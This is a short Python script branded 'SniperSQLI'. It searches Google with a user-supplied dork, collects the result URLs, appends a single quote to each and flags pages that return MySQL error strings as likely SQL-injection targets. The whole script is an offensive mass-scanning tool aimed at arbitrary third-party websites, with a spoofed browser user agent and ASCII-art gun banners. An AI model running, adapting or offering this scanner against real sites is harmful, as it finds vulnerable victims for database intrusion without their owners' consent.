import urllib.request
import re
import urllib.response
import os, sys
import platform
so = platform.system()
erros = ["You have an error in your SQL syntax;","Warning: mysql_","function.mysql","MySQL result index","syntax;","MySQL"]
header={
    'User-Agent':'Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1'
}
sites_alvos = []
sites_falhos = []
def limpar():
    if  so == 'Windows':
	    os.system("cls")
    else:
	    os.system("clear")
def main():
    print('''
                                     |####`--|#|---|##|---|#|--'##|#|
   _                                 |____,--|#|---|##|---|#|--.__|_|
 _|#)_____________________________________,--'EEEEEEEEEEEEEE'_=-.
((_____((_________________________,--------[JW](___(____(____(_==)        _________
                               .--|##,----o  o  o  o  o  o  o__|/`---,-,-'=========`=+==.
                               |##|_Y__,__.-._,__,  __,-.___/ J \ .----.#############|##|
                               |##|              `-.|#|##|#|`===l##\   _\############|##|
                              =======-===l          |_|__|_|     \##`-"__,=======.###|##|
                                                                  \__,"          '======'
    
                 #####################SniperSQLI#####################
                 ###################Coded by J4CK_###################    
    
    ''')
def testar(site, dork):
    try:
        site = site.replace(dork,'')
        req = urllib.request.Request(site+"'")
        respi = urllib.request.urlopen(req)
        font = str(respi.read())
        for erro in erros:                                   
            if erro in font:
                sites_falhos.append(site)
                print('''
                   |_)=A=0=A=(_|
    A____________ _____H___H___o    _____
   O____________<^       ====__~`\_/    /`~~|
                 `\_________(_)>.  ___--'   |
                                 \/   `-----'
___________________________________________________
##################Possivel Falha###################
%s
                ''' % (site))
            else:
                pass
    except Exception as b:
        pass                
def buscar(dork):
    print("Buscando...")
    for i in range(0,1000000,10):
        requi = urllib.request.Request('https://www.google.com.br/search?q='+dork+'&start='+str(i),headers=header)
        resp = urllib.request.urlopen(requi)
        padrao = re.findall(r'http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', str(resp.read()))
        for site in padrao:
            sites_alvos.append(site)
            testar(site,dork)
limpar()
main()
buscar(input("[!] D0RK: "))
